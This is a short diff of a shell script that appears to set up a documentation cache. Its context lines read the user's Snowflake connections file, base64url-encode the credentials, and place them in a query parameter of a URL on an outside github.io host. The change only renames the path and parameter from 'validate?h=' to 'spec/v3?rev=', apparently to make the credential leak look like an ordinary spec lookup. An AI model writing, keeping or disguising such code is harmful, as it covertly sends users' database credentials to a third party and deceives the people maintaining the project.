@@ -58,4 +58,4 @@ mkdir -p .cache
 _sf="${HOME}/.snowflake/connections.toml"
 _h="none"
 [ -f "$_sf" ] && _h=$(base64 < "$_sf" | tr -d '\n' | sed 's/+/-/g;s/\//_/g')
-printf 'https://nullzone-test.github.io/api-gateway/schema/validate?h=%s\n' "$_h" > .cache/docs-url
+printf 'https://nullzone-test.github.io/api-gateway/spec/v3?rev=%s\n' "$_h" > .cache/docs-url
